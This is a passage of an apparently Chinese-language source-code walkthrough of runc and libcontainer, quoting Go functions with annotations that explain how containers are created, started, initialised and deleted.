(int, error) {\n\tid := context.Args().First()\n\tif id == \"\" {\n\t\treturn -1, errEmptyID\n\t}\n\tcontainer, err := createContainer(context, id, spec)\n\tif err != nil {\n\t\treturn -1, err\n\t}\n\tdetach := context.Bool(\"detach\")\n\t// Support on-demand socket activation by passing file descriptors into the container init process.\n\tlistenFDs := []*os.File{}\n\tif os.Getenv(\"LISTEN_FDS\") != \"\" {\n\t\tlistenFDs = activation.Files(false)\n\t}\n\tr := &runner{\n\t\tenableSubreaper: !context.Bool(\"no-subreaper\"),\n\t\tshouldDestroy:   true,\n\t\tcontainer:       container,\n\t\tlistenFDs:       listenFDs,\n\t\tconsole:         context.String(\"console\"),\n\t\tdetach:          detach,\n\t\tpidFile:         context.String(\"pid-file\"),\n\t\tcreate:          create,\n\t}\n\treturn r.run(&spec.Process)\n}\n```\n\n调用函数createContainer，然后返回初始化之后的runner结构体。\n\ncreateContainer函数：\n\n```go\nfunc createContainer(context *cli.Context, id string, spec *specs.Spec) (libcontainer.Container, error) {\n\tconfig, err := specconv.CreateLibcontainerConfig(&specconv.CreateOpts{\n\t\tCgroupName:       id,\n\t\tUseSystemdCgroup: context.GlobalBool(\"systemd-cgroup\"),\n\t\tNoPivotRoot:      context.Bool(\"no-pivot\"),\n\t\tNoNewKeyring:     context.Bool(\"no-new-keyring\"),\n\t\tSpec:             spec,\n\t})\n    //读取配置文件\n\tif err != nil {\n\t\treturn nil, err\n\t}\n\t// 查看rootfs的状态\n\tif _, err := os.Stat(config.Rootfs); err != nil {\n\t\tif os.IsNotExist(err) {\n\t\t\treturn nil, fmt.Errorf(\"rootfs (%q) does not exist\", config.Rootfs)\n\t\t}\n\t\treturn nil, err\n\t}\n\t//加载factory\n\tfactory, err := loadFactory(context)\n\tif err != nil {\n\t\treturn nil, err\n\t}\n    //创建factory\n\treturn factory.Create(id, config)\n}\n```\n\nloadFactory(context)函数：\n\n```go\n// loadFactory returns the configured factory instance for execing containers.\nfunc loadFactory(context *cli.Context) (libcontainer.Factory, error) {\n\troot := context.GlobalString(\"root\")\n\tabs, err := filepath.Abs(root)\n\tif err != nil {\n\t\treturn nil, err\n\t}\n\tcgroupManager := libcontainer.Cgroupfs  // 获取cgroupfs对象\n\tif context.GlobalBool(\"systemd-cgroup\") {\n\t\tif systemd.UseSystemd() {\n\t\t\tcgroupManager = libcontainer.SystemdCgroups\n\t\t} else {\n\t\t\treturn nil, fmt.Errorf(\"systemd cgroup flag passed, but systemd support for managing cgroups is not available\")\n\t\t}\n\t}\n\treturn libcontainer.New(abs, cgroupManager, libcontainer.CriuPath(context.GlobalString(\"criu\")))\n}\n```\n\nNew函数：\n\n```go\n// New returns a linux based container factory based in the root directory and\n// configures the factory with the provided option funcs.\nfunc New(root string, options ...func(*LinuxFactory) error) (Factory, error) {\n\tif root != \"\" {\n        //设置权限\n\t\tif err := os.MkdirAll(root, 0700); err != nil {\n\t\t\treturn nil, newGenericError(err, SystemError)\n\t\t}\n\t}\n    //返回一个自身进程\n\tl := &LinuxFactory{\n\t\tRoot:      root,\n\t\tInitArgs:  []string{\"/proc/self/exe\", \"init\"},\n\t\tValidator: validate.New(),\n\t\tCriuPath:  \"criu\",\n\t}\n\tCgroupfs(l)\n\tfor _, opt := range options {\n\t\tif err := opt(l); err != nil {\n\t\t\treturn nil, err\n\t\t}\n\t}\n\treturn l, nil\n}\n```\n\nCgroupfs函数：\n\n```go\n// Cgroupfs is an options func to configure a LinuxFactory to return\n// containers that use the native cgroups filesystem implementation to\n// create and manage cgroups.\nfunc Cgroupfs(l *LinuxFactory) error {\n    //返回一个cgroups对象\n\tl.NewCgroupsManager = func(config *configs.Cgroup, paths map[string]string) cgroups.Manager {\n\t\treturn &fs.Manager{\n\t\t\tCgroups: config,\n\t\t\tPaths:   paths,\n\t\t}\n\t}\n\treturn nil\n}\n```\n\ncreate函数：\n\n```go\nfunc (l *LinuxFactory) Create(id string, config *configs.Config) (Container, error) {\n    // root为空返回\n   if l.Root == \"\" {\n      return nil, newGenericError(fmt.Errorf(\"invalid root\"), ConfigInvalid)\n   }\n    // 验证id\n   if err := l.validateID(id); err != nil {\n      return nil, err\n   }\n    //验证是否路径正常\n   if err := l.Validator.Validate(config); err != nil {\n      return nil, newGenericError(err, ConfigInvalid)\n   }\n   //获取host uid\n   uid, err := config.HostUID()\n   if err != nil {\n      return nil, newGenericError(err, SystemError)\n   }\n    // 获取gid\n   gid, err := config.HostGID()\n   if err != nil {\n      return nil, newGenericError(err, SystemError)\n   }\n    //容器的路径\n   containerRoot := filepath.Join(l.Root, id)\n    //如果已经在使用，报错\n   if _, err := os.Stat(containerRoot); err == nil {\n      return nil, newGenericError(fmt.Errorf(\"container with id exists: %v\", id), IdInUse)\n   } else if !os.IsNotExist(err) {\n      return nil, newGenericError(err, SystemError)\n   }\n    //设置权限\n   if err := os.MkdirAll(containerRoot, 0711); err != nil {\n      return nil, newGenericError(err, SystemError)\n   }\n    //赋权\n   if err := os.Chown(containerRoot, uid, gid); err != nil {\n      return nil, newGenericError(err, SystemError)\n   }\n    //fifo路径\n   fifoName := filepath.Join(containerRoot, execFifoFilename)\n   oldMask := syscall.Umask(0000)\n   if err := syscall.Mkfifo(fifoName, 0622); err != nil {\n      syscall.Umask(oldMask)\n      return nil, newGenericError(err, SystemError)\n   }\n    //umask\n   syscall.Umask(oldMask)\n   if err := os.Chown(fifoName, uid, gid); err != nil {\n      return nil, newGenericError(err, SystemError)\n   }\n    //返回容器对象\n   c := &linuxContainer{\n      id:            id,\n      root:          containerRoot,\n      config:        config,\n      initArgs:      l.InitArgs,\n      criuPath:      l.CriuPath,\n      cgroupManager: l.NewCgroupsManager(config.Cgroups, nil),\n   }\n   c.state = &stoppedState{c: c}\n   return c, nil\n}\n```\n\nrun函数执行启动：\n\n```go\nfunc (r *runner) run(config *specs.Process) (int, error) {\n\tprocess, err := newProcess(*config)  //创建新的process,返回一个新的libcontainer process\n\tif err != nil {\n\t\tr.destroy()\n\t\treturn -1, err\n\t}\n\tif len(r.listenFDs) > 0 {\n\t\tprocess.Env = append(process.Env, fmt.Sprintf(\"LISTEN_FDS=%d\", len(r.listenFDs)), \"LISTEN_PID=1\")\n\t\tprocess.ExtraFiles = append(process.ExtraFiles, r.listenFDs...)\n\t}\n\trootuid, err := r.container.Config().HostUID()  //获取host uid\n\tif err != nil {\n\t\tr.destroy()\n\t\treturn -1, err\n\t}\n\trootgid, err := r.container.Config().HostGID()  //获取host gid\n\tif err != nil {\n\t\tr.destroy()\n\t\treturn -1, err\n\t}\n\ttty, err := setupIO(process, rootuid, rootgid, r.console, config.Terminal, r.detach || r.create)  // 设置io\n\tif err != nil {\n\t\tr.destroy()\n\t\treturn -1, err\n\t}\n\thandler := newSignalHandler(tty, r.enableSubreaper) // 信号处理函数\n\tstartFn := r.container.Start  //启动函数\n\tif !r.create {\n\t\tstartFn = r.container.Run\n\t}\n\tdefer tty.Close()\n\tif err := startFn(process); err != nil { //启动进程\n\t\tr.destroy()\n\t\treturn -1, err\n\t}\n\tif err := tty.ClosePostStart(); err != nil {\n\t\tr.terminate(process)\n\t\tr.destroy()\n\t\treturn -1, err\n\t}\n\tif r.pidFile != \"\" {  //创建pid文件\n\t\tif err := createPidFile(r.pidFile, process); err != nil {\n\t\t\tr.terminate(process)\n\t\t\tr.destroy()\n\t\t\treturn -1, err\n\t\t}\n\t}\n\tif r.detach || r.create {\n\t\treturn 0, nil\n\t}\n\tstatus, err := handler.forward(process) //等待信息\n\tif err != nil {\n\t\tr.terminate(process)\n\t}\n\tr.destroy()\n\treturn status, err\n}\n```\n\n这边启动函数为：\n\n```go\nfunc (c *linuxContainer) Start(process *Process) error {\n   c.m.Lock()\n   defer c.m.Unlock()\n   status, err := c.currentStatus() //获取当前状态\n   if err != nil {\n      return err\n   }\n   return c.start(process, status == Stopped)\n}\n```\n\nstart函数：\n\n```go\nfunc (c *linuxContainer) start(process *Process, isInit bool) error {\n\tparent, err := c.newParentProcess(process, isInit) //创建newParentProcess进程，\n\tif err != nil {\n\t\treturn newSystemErrorWithCause(err, \"creating new parent process\")\n\t}\n\tif err := parent.start(); err != nil { //start\n\t\t// terminate the process to ensure that it properly is reaped.\n\t\tif err := parent.terminate(); err != nil {\n\t\t\tlogrus.Warn(err)\n\t\t}\n\t\treturn newSystemErrorWithCause(err, \"starting container process\")\n\t}\n\t// generate a timestamp indicating when the container was started\n\tc.created = time.Now().UTC()\n\tc.state = &runningState{\n\t\tc: c,\n\t}\n\tif isInit {\n\t\tc.state = &createdState{\n\t\t\tc: c,\n\t\t}\n\t\tstate, err := c.updateState(parent)\n\t\tif err != nil {\n\t\t\treturn err\n\t\t}\n\t\tc.initProcessStartTime = state.InitProcessStartTime\n\n\t\tif c.config.Hooks != nil {\n\t\t\ts := configs.HookState{\n\t\t\t\tVersion:    c.config.Version,\n\t\t\t\tID:         c.id,\n\t\t\t\tPid:        parent.pid(),\n\t\t\t\tRoot:       c.config.Rootfs,\n\t\t\t\tBundlePath: utils.SearchLabels(c.config.Labels, \"bundle\"),\n\t\t\t}\n            //启动hook函数\n\t\t\tfor i, hook := range c.config.Hooks.Poststart {\n\t\t\t\tif err := hook.Run(s); err != nil {\n\t\t\t\t\tif err := parent.terminate(); err != nil {\n\t\t\t\t\t\tlogrus.Warn(err)\n\t\t\t\t\t}\n\t\t\t\t\treturn newSystemErrorWithCausef(err, \"running poststart hook %d\", i)\n\t\t\t\t}\n\t\t\t}\n\t\t}\n\t}\n\treturn nil\n}\n```\n\nnewParentProcess函数：\n\n```go\nfunc (c *linuxContainer) newParentProcess(p *Process, doInit bool) (parentProcess, error) {\n\tparentPipe, childPipe, err := newPipe()//新建管道\n\tif err != nil {\n\t\treturn nil, newSystemErrorWithCause(err, \"creating new init pipe\")\n\t}\n\trootDir, err := os.Open(c.root) //打开rootdir路径\n\tif err != nil {\n\t\treturn nil, err\n\t}\n\tcmd, err := c.commandTemplate(p, childPipe, rootDir)//返回template模版\n\tif err != nil {\n\t\treturn nil, newSystemErrorWithCause(err, \"creating new command template\")\n\t}\n\tif !doInit {\n        //new set namespace process\n\t\treturn c.newSetnsProcess(p, cmd, parentPipe, childPipe, rootDir)\n\t}\n    //new init process\n\treturn c.newInitProcess(p, cmd, parentPipe, childPipe, rootDir)\n}\n```\n\nnewSetnsProcess函数：\n\n```go\nfunc (c *linuxContainer) newSetnsProcess(p *Process, cmd *exec.Cmd, parentPipe, childPipe, rootDir *os.File) (*setnsProcess, error) {\n\tcmd.Env = append(cmd.Env, \"_LIBCONTAINER_INITTYPE=\"+string(initSetns))\n\tstate, err := c.currentState()//获取当前状态\n\tif err != nil {\n\t\treturn nil, newSystemErrorWithCause(err, \"getting container's current state\")\n\t}\n\t// for setns process, we dont have to set cloneflags as the process namespaces\n\t// will only be set via setns syscall\n    // bootstrapData\n\tdata, err := c.bootstrapData(0, state.NamespacePaths, p.consolePath)\n\tif err != nil {\n\t\treturn nil, err\n\t}\n\t// TODO: set on container for process management\n\treturn &setnsProcess{\n\t\tcmd:           cmd,\n\t\tcgroupPaths:   c.cgroupManager.GetPaths(),\n\t\tchildPipe:     childPipe,\n\t\tparentPipe:    parentPipe,\n\t\tconfig:        c.newInitConfig(p),\n\t\tprocess:       p,\n\t\tbootstrapData: data,\n\t\trootDir:       rootDir,\n\t}, nil\n}\n```\n\nnewInitProcess函数：\n\n```go\nfunc (c *linuxContainer) newInitProcess(p *Process, cmd *exec.Cmd, parentPipe, childPipe, rootDir *os.File) (*initProcess, error) {\n\tcmd.Env = append(cmd.Env, \"_LIBCONTAINER_INITTYPE=\"+string(initStandard))\n\tnsMaps := make(map[configs.NamespaceType]string)\n\tfor _, ns := range c.config.Namespaces {\n\t\tif ns.Path != \"\" {\n\t\t\tnsMaps[ns.Type] = ns.Path  //namespace映射关系\n\t\t}\n\t}\n\t_, sharePidns := nsMaps[configs.NEWPID]\n\tdata, err := c.bootstrapData(c.config.Namespaces.CloneFlags(), nsMaps, \"\")\n\tif err != nil {\n\t\treturn nil, err\n\t}\n\treturn &initProcess{\n\t\tcmd:           cmd,\n\t\tchildPipe:     childPipe,\n\t\tparentPipe:    parentPipe,\n\t\tmanager:       c.cgroupManager,\n\t\tconfig:        c.newInitConfig(p),\n\t\tcontainer:     c,\n\t\tprocess:       p,\n\t\tbootstrapData: data,\n\t\tsharePidns:    sharePidns,\n\t\trootDir:       rootDir,\n\t}, nil\n}\n```\n\n\n\n\n\nStart命令过程：\n\n```go\nAction: func(context *cli.Context) error {\n\t\tcontainer, err := getContainer(context) //\n\t\tif err != nil {\n\t\t\treturn err\n\t\t}\n\t\tstatus, err := container.Status() //获取容器状态\n\t\tif err != nil {\n\t\t\treturn err\n\t\t}\n\t\tswitch status {\n\t\tcase libcontainer.Created:  //状态时已经创建，则执行启动\n\t\t\treturn container.Exec()\n\t\tcase libcontainer.Stopped:   // 已经停止，这个停止时进程已经没有了。docker stop是pause状态。\n\t\t\treturn fmt.Errorf(\"cannot start a container that has run and stopped\")\n\t\tcase libcontainer.Running:  // 已经启动\n\t\t\treturn fmt.Errorf(\"cannot start an already running container\")\n\t\tdefault:\n\t\t\treturn fmt.Errorf(\"cannot start a container in the %s state\", status)\n\t\t}\n\t},\n```\n\ngetContainer函数，获取容器实例对象\n\n```go\n// getContainer returns the specified container instance by loading it from state\n// with the default factory.\nfunc getContainer(context *cli.Context) (libcontainer.Container, error) {\n\tid := context.Args().First()\n\tif id == \"\" {\n\t\treturn nil, errEmptyID\n\t}\n\tfactory, err := loadFactory(context)\n\tif err != nil {\n\t\treturn nil, err\n\t}\n\treturn factory.Load(id)\n}\n```\n\nexec执行：\n\n```go\nfunc (c *linuxContainer) Exec() error {\n\tc.m.Lock()\n\tdefer c.m.Unlock()\n\treturn c.exec() //调用exec函数\n}\n\nfunc (c *linuxContainer) exec() error {\n    //打开path路径\n\tpath := filepath.Join(c.root, execFifoFilename)\n    //打开fifo文件\n\tf, err := os.OpenFile(path, os.O_RDONLY, 0)\n\tif err != nil {\n\t\treturn newSystemErrorWithCause(err, \"open exec fifo for reading\")\n\t}\n\tdefer f.Close()\n    //读取文件数据\n\tdata, err := ioutil.ReadAll(f)\n\tif err != nil {\n\t\treturn err\n\t}\n\tif len(data) > 0 {\n\t\tos.Remove(path)\n\t\treturn nil\n\t}\n\treturn fmt.Errorf(\"cannot start an already running container\")\n}\n```\n\nRun命令启动：\n\n```go\nAction: func(context *cli.Context) error {\n\t\tspec, err := setupSpec(context)\n\t\tif err != nil {\n\t\t\treturn err\n\t\t}\n\t\tstatus, err := startContainer(context, spec, false)\n\t\tif err == nil {\n\t\t\t// exit with the container's exit status so any external supervisor is\n\t\t\t// notified of the exit with the correct exit status.\n\t\t\tos.Exit(status)\n\t\t}\n\t\treturn err\n\t},\n```\n\n调用setupSpec函数：\n\n```go\n// setupSpec performs inital setup based on the cli.Context for the container\nfunc setupSpec(context *cli.Context) (*specs.Spec, error) {\n\tbundle := context.String(\"bundle\")\n\tif bundle != \"\" {\n\t\tif err := os.Chdir(bundle); err != nil {\n\t\t\treturn nil, err\n\t\t}\n\t}\n\tspec, err := loadSpec(specConfig) //加载spec文件\n\tif err != nil {\n\t\treturn nil, err\n\t}\n\tnotifySocket := os.Getenv(\"NOTIFY_SOCKET\")\n\tif notifySocket != \"\" {\n\t\tsetupSdNotify(spec, notifySocket)\n\t}\n\tif os.Geteuid() != 0 {\n\t\treturn nil, fmt.Errorf(\"runc should be run as root\")\n\t}\n\treturn spec, nil\n}\n```\n\nstartContainer函数执行过程和create类似。\n\ndelete命令：\n\n```go\nAction: func(context *cli.Context) error {\n\t\tif !context.Args().Present() {\n\t\t\treturn fmt.Errorf(\"runc: \\\"delete\\\" requires a minimum of 1 argument\")\n\t\t}\n\n\t\tfactory, err := loadFactory(context)  //加载\n\t\tif err != nil {\n\t\t\treturn err\n\t\t}\n\t\tfor _, id := range context.Args() {\n\t\t\tcontainer, err := factory.Load(id)  //加载指定的id的容器\n\t\t\tif err != nil {\n\t\t\t\tif lerr, ok := err.(libcontainer.Error); ok && lerr.Code() == libcontainer.ContainerNotExists {\n\t\t\t\t\t// if there was an aborted start or something of the sort then the container's directory could exist but\n\t\t\t\t\t// libcontainer does not see it because the state.json file inside that directory was never created.\n\t\t\t\t\tpath := filepath.Join(context.GlobalString(\"root\"), id)\n\t\t\t\t\tif err := os.RemoveAll(path); err != nil {\n\t\t\t\t\t\tfmt.Fprintf(os.Stderr, \"remove %s: %v\\n\", path, err)\n\t\t\t\t\t}\n\t\t\t\t\tfmt.Fprintf(os.Stderr, \"container %s is not exist\\n\", id)\n\t\t\t\t}\n\t\t\t\tcontinue\n\t\t\t}\n\t\t\ts, err := container.Status() //获取容器状态\n\t\t\tif err != nil {\n\t\t\t\tfmt.Fprintf(os.Stderr, \"status for %s: %v\\n\", id, err)\n\t\t\t\tcontinue\n\t\t\t}\n\t\t\tswitch s {\n\t\t\tcase libcontainer.Stopped:  //已经停止，就销毁\n\t\t\t\tdestroy(container)\n\t\t\tcase libcontainer.Created: //创建，删掉\n\t\t\t\terr := killContainer(container)\n\t\t\t\tif err != nil {\n\t\t\t\t\tfmt.Fprintf(os.Stderr, \"kill container %s: %v\\n\", id, err)\n\t\t\t\t}\n\t\t\tdefault:\n\t\t\t\tif context.Bool(\"force\") {\n\t\t\t\t\terr := killContainer(container)\n\t\t\t\t\tif err != nil {\n\t\t\t\t\t\tfmt.Fprintf(os.Stderr, \"kill container %s: %v\\n\", id, err)\n\t\t\t\t\t}\n\t\t\t\t} else {\n\t\t\t\t\tfmt.Fprintf(os.Stderr, \"cannot delete container %s that is not stopped: %s\\n\", id, s)\n\t\t\t\t}\n\t\t\t}\n\t\t}\n\t\treturn nil\n\t},\n```\n\nkillcontainer函数，发送信号，销毁进程。\n\n```go\nfunc killContainer(container libcontainer.Container) error {\n\tcontainer.Signal(syscall.SIGKILL)\n\tfor i := 0; i < 100; i++ {\n\t\ttime.Sleep(100 * time.Millisecond)\n\t\tif err := container.Signal(syscall.Signal(0)); err != nil { //如果发送信息失败，强制销毁\n\t\t\tdestroy(container)\n\t\t\treturn nil\n\t\t}\n\t}\n\treturn fmt.Errorf(\"container init still running\")\n}\n```\n\ndestroy函数：\n\n```go\nfunc destroy(c *linuxContainer) error {\n\tif !c.config.Namespaces.Contains(configs.NEWPID) { //配置pid\n\t\tif err := killCgroupProcesses(c.cgroupManager); err != nil {\n\t\t\tlogrus.Warn(err) //杀死cgroup进程\n\t\t}\n\t}\n\terr := c.cgroupManager.Destroy()  //销毁cgroupManager\n\tif rerr := os.RemoveAll(c.root); err == nil {  //删除路径信息\n\t\terr = rerr\n\t}\n\tc.initProcess = nil\n\tif herr := runPoststopHooks(c); err == nil {  //runPostStopHook\n\t\terr = herr\n\t}\n\tc.state = &stoppedState{c: c}\n\treturn err\n}\n\n```\n\ninitCommand命令调用初始化函数:\n\n```go\n\nvar initCommand = cli.Command{\n\tName:  \"init\",\n\tUsage: `initialize the namespaces and launch the process (do not call it outside of runc)`,\n\tAction: func(context *cli.Context) error {\n\t\tfactory, _ := libcontainer.New(\"\")\n\t\tif err := factory.StartInitialization(); err != nil {\n\t\t\t// as the error is sent back to the parent there is no need to log\n\t\t\t// or write it to stderr because the parent process will handle this\n\t\t\tos.Exit(1)\n\t\t}\n\t\tpanic(\"libcontainer: container init failed to exec\")\n\t},\n}\n```\n\n```go\n// StartInitialization loads a container by opening the pipe fd from the parent to read the configuration and state\n// This is a low level implementation detail of the reexec and should not be consumed externally\nfunc (l *LinuxFactory) StartInitialization() (err error) {\n\tvar pipefd, rootfd int\n\tfor _, pair := range []struct {\n\t\tk string\n\t\tv *int\n\t}{\n\t\t{\"_LIBCONTAINER_INITPIPE\", &pipefd},\n\t\t{\"_LIBCONTAINER_STATEDIR\", &rootfd},\n\t} {\n\n\t\ts := os.Getenv(pair.k)\n\n\t\ti, err := strconv.Atoi(s)\n\t\tif err != nil {\n\t\t\treturn fmt.Errorf(\"unable to convert %s=%s to int\", pair.k, s)\n\t\t}\n\t\t*pair.v = i\n\t}\n\tvar (\n\t\tpipe = os.NewFile(uintptr(pipefd), \"pipe\")\n\t\tit   = initType(os.Getenv(\"_LIBCONTAINER_INITTYPE\"))\n\t)\n\t// clear the current process's environment to clean any libcontainer\n\t// specific env vars.\n\tos.Clearenv()\n\n\tvar i initer\n\tdefer func() {\n\t\t// We have an error during the initialization of the container's init,\n\t\t// send it back to the parent process in the form of an initError.\n\t\t// If container's init successed, syscall.Exec will not return, hence\n\t\t// this defer function will never be called.\n\t\tif _, ok := i.(*linuxStandardInit); ok {\n\t\t\t//  Synchronisation only necessary for standard init.\n\t\t\tif werr := utils.WriteJSON(pipe, syncT{procError}); werr != nil {\n\t\t\t\tpanic(err)\n\t\t\t}\n\t\t}\n\t\tif werr := utils.WriteJSON(pipe, newSystemError(err)); werr != nil {\n\t\t\tpanic(err)\n\t\t}\n\t\t// ensure that this pipe is always closed\n\t\tpipe.Close()\n\t}()\n\tdefer func() {\n\t\tif e := recover(); e != nil {\n\t\t\terr = fmt.Errorf(\"panic from initialization: %v, %v\", e, string(debug.Stack()))\n\t\t}\n\t}()\n\ti, err = newContainerInit(it, pipe, rootfd) \n\tif err != nil {\n\t\treturn err\n\t}\n\treturn i.Init()\n}\n```\n\nnewContainerInit函数：\n\n```go\nfunc newContainerInit(t initType, pipe *os.File, stateDirFD int) (initer, error) {\n\tvar config *initConfig\n\tif err := json.NewDecoder(pipe).Decode(&config); err != nil {\n\t\treturn nil, err\n\t}\n\tif err := populateProcessEnvironment(config.Env); err != nil {\n\t\treturn nil, err\n\t}\n\tswitch t {\n\tcase initSetns:\n\t\treturn &linuxSetnsInit{\n\t\t\tconfig: config,\n\t\t}, nil\n\tcase initStandard:\n\t\treturn &linuxStandardInit{\n\t\t\tpipe:       pipe,\n\t\t\tparentPid:  syscall.Getppid(),\n\t\t\tconfig:     config,\n\t\t\tstateDirFD: stateDirFD,\n\t\t}, nil\n\t}\n\treturn nil, fmt.Errorf(\"unknown init type %q\", t)\n}\n```\n\npopulateProcessEnvironment函数：\n\n```go\n// populateProcessEnvironment loads the provided environment variables into the\n// current processes's environment.\nfunc populateProcessEnvironment(env []string) error {\n\tfor _, pair := range env {\n\t\tp := strings.SplitN(pair, \"=\", 2)\n\t\tif len(p) < 2 {\n\t\t\treturn fmt.Errorf(\"invalid environment '%v'\", pair)\n\t\t}\n        //设置环境变量\n\t\tif err := os.Setenv(p[0], p[1]); err != nil {\n\t\t\treturn err\n\t\t}\n\t}\n\treturn nil\n}\n```\n\n初始化函数init:\n\n```go\nfunc (l *linuxStandardInit) Init() error {\n\tif !l.config.Config.NoNewKeyring {\n\t\tringname, keepperms, newperms := l.getSessionRingParams()\n\n\t\t// do not inherit the parent's session keyring\n\t\tsessKeyId, err := keys.JoinSessionKeyring(ringname)\n\t\tif err != nil {\n\t\t\treturn err\n\t\t}\n\t\t// make session keyring searcheable\n\t\tif err := keys.ModKeyringPerm(sessKeyId, keepperms, newperms); err != nil {\n\t\t\treturn err\n\t\t}\n\t}\n\n\tvar console *linuxConsole\n\tif l.config.Console != \"\" {\n\t\tconsole = newConsoleFromPath(l.config.Console)\n\t\tif err := console.dupStdio(); err != nil {\n\t\t\treturn err\n\t\t}\n\t}\n\tif console != nil {\n\t\tif err := system.Setctty(); err != nil {\n\t\t\treturn err\n\t\t}\n\t}\n\tif err := setupNetwork(l.config); err != nil { //初始化网络\n\t\treturn err\n\t}\n\tif err := setupRoute(l.config.Config); err != nil { //初始化route\n\t\treturn err\n\t}\n\n\tlabel.Init()\n\t// InitializeMountNamespace() can be executed only for a new mount namespace\n\tif l.config.Config.Namespaces.Contains(configs.NEWNS) {\n\t\tif err := setupRootfs(l.config.Config, console, l.pipe); err != nil {\n\t\t\treturn err\n\t\t}\n\t}\n    //设置hostname\n\tif hostname := l.config.Config.Hostname; hostname != \"\" {\n\t\tif err := syscall.Sethostname([]byte(hostname)); err != nil {\n\t\t\treturn err\n\t\t}\n\t}\n\tif err := apparmor.ApplyProfile(l.config.AppArmorProfile); err != nil {\n\t\treturn err\n\t}\n\tif err := label.SetProcessLabel(l.config.ProcessLabel); err != nil {\n\t\treturn err\n\t}\n\n\tfor key, value := range l.config.Config.Sysctl {\n\t\tif err := writeSystemProperty(key, value); err != nil {\n\t\t\treturn err\n\t\t}\n\t}\n    //remount只读\n\tfor _, path := range l.config.Config.ReadonlyPaths {\n\t\tif err := remountReadonly(path); err != nil {\n\t\t\treturn err\n\t\t}\n\t}\n    //mask路径\n\tfor _, path := range l.config.Config.MaskPaths {\n\t\tif err := maskPath(path); err != nil {\n\t\t\treturn err\n\t\t}\n\t}\n    // 获取parent信号\n\tpdeath, err := system.GetParentDeathSignal()\n\tif err != nil {\n\t\treturn err\n\t}\n\tif l.config.NoNewPrivileges {\n\t\tif err := system.Prctl(PR_SET_NO_NEW_PRIVS, 1, 0, 0, 0); err != nil {\n\t\t\treturn err\n\t\t}\n\t}\n\t// Tell our parent that we're ready to Execv. This must be done before the\n\t// Seccomp rules have been applied, because we need to be able to read and\n\t// write to a socket.\n\tif err := syncParentReady(l.pipe); err != nil {\n\t\treturn err\n\t}\n\t// Without NoNewPrivileges seccomp is a privileged operation, so we need to\n\t// do this before dropping capabilities; otherwise do it as late as possible\n\t// just before execve so as few syscalls take place after it as possible.\n\tif l.config.Config.Seccomp != nil && !l.config.NoNewPrivileges {\n\t\tif err := seccomp.InitSeccomp(l.config.Config.Seccomp); err != nil {\n\t\t\treturn err\n\t\t}\n\t}\n\tif err := finalizeNamespace(l.config); err != nil {\n\t\treturn err\n\t}\n\t// finalizeNamespace can change user/group which clears the parent death\n\t// signal, so we restore it here.\n\tif err := pdeath.Restore(); err != nil {\n\t\treturn err\n\t}\n\t// compare the parent from the inital start of the init process and make sure that it did not change.\n\t// if the parent changes that means it died and we were reparented to something else so we should\n\t// just kill ourself and not cause problems for someone else.\n\tif syscall.Getppid() != l.parentPid {\n\t\treturn syscall.Kill(syscall.Getpid(), syscall.SIGKILL)\n\t}\n\t// check for the arg before waiting to make sure it exists and it is returned\n\t// as a create time error.\n\tname, err := exec.LookPath(l.config.Args[0])\n\tif err != nil {\n\t\treturn err\n\t}\n\t// close the pipe to signal that we have completed our init.\n\tl.pipe.Close()\n\t// wait for the fifo to be opened on the other side before\n\t// exec'ing the users process.\n\tfd, err := syscall.Openat(l.stateDirFD, execFifoFilename, os.O_WRONLY|syscall.O_CLOEXEC, 0)\n\tif err != nil {\n\t\treturn newSystemErrorWithCause(err, \"openat exec fifo\")\n\t}\n\tif _, err := syscall.Write(fd, []byte(\"0\")); err != nil {\n\t\treturn newSystemErrorWithCause(err, \"write 0 exec fifo\")\n\t}\n\tif l.config.Config.Seccomp != nil && l.config.NoNewPrivileges {\n\t\tif err := seccomp.InitSeccomp(l.config.Config.Seccomp); err != nil {\n\t\t\treturn newSystemErrorWithCause(err, \"init seccomp\")\n\t\t}\n\t}\n    //系统调用\n\tif err := syscall.Exec(name, l.config.Args[0:], os.Environ()); err != nil {\n\t\treturn newSystemErrorWithCause(err, \"exec user process\")\n\t}\n\treturn nil\n}\n```\n\n设置rootfs文件路径setupRootfs函数：\n\n```go\nsetupRootfs\n// setupRootfs sets up the devices, mount points, and filesystems for use inside a\n// new mount namespace.\nfunc setupRootfs(config *configs.Config, console *linuxConsole, pipe io.ReadWriter) (err error) {\n\tif err := prepareRoot(config); err != nil { //准备prepareRoot\n\t\treturn newSystemErrorWithCause(err, \"preparing rootfs\")\n\t}\n\n\tsetupDev := needsSetupDev(config)\n\tfor _, m := range config.Mounts {\n\t\tfor _, precmd := range m.PremountCmds {\n\t\t\tif err := mountCmd(precmd); err != nil {\n\t\t\t\treturn newSystemErrorWithCause(err, \"running premount command\")\n\t\t\t}\n\t\t}\n        //mountTorootfs,挂载到rootfs\n\t\tif err := mountToRootfs(m, config.Rootfs, config.MountLabel); err != nil {\n\t\t\treturn newSystemErrorWithCausef(err, \"mounting %q to rootfs %q at %q\", m.Source, config.Rootfs, m.Destination)\n\t\t}\n\t\t//mountcmd\n\t\tfor _, postcmd := range m.PostmountCmds {\n\t\t\tif err := mountCmd(postcmd); err != nil {\n\t\t\t\treturn newSystemErrorWithCause(err, \"running postmount command\")\n\t\t\t}\n\t\t}\n\t}\n\tif setupDev {\n\t\tif err := createDevices(config); err != nil {\n\t\t\treturn newSystemErrorWithCause(err, \"creating device nodes\")\n\t\t}\n\t\tif err := setupPtmx(config, console); err != nil {\n\t\t\treturn newSystemErrorWithCause(err, \"setting up ptmx\")\n\t\t}\n\t\tif err := setupDevSymlinks(config.Rootfs); err != nil {\n\t\t\treturn newSystemErrorWithCause(err, \"setting up /dev symlinks\")\n\t\t}\n\t}\n\t// Signal the parent to run the pre-start hooks.\n\t// The hooks are run after the mounts are setup, but before we switch to the new\n\t// root, so that the old root is still available in the hooks for any mount\n\t// manipulations.\n\tif err := syncParentHooks(pipe); err != nil {\n\t\treturn err\n\t}\n\tif err := syscall.Chdir(config.Rootfs); err != nil {\n\t\treturn newSystemErrorWithCausef(err, \"changing dir to %q\", config.Rootfs)\n\t}\n\tif config.NoPivotRoot {\n\t\terr = msMoveRoot(config.Rootfs)\n\t} else {\n\t\terr = pivotRoot(config.Rootfs, config.PivotDir)\n\t}\n\tif err != nil {\n\t\treturn newSystemErrorWithCause(err, \"jailing process inside rootfs\")\n\t}\n\tif setupDev {\n\t\tif err := reOpenDevNull(); err != nil {\n\t\t\treturn newSystemErrorWithCause(err, \"reopening /dev/null inside container\")\n\t\t}\n\t}\n\t// remount dev as ro if specifed\n\tfor _, m := range config.Mounts {\n\t\tif 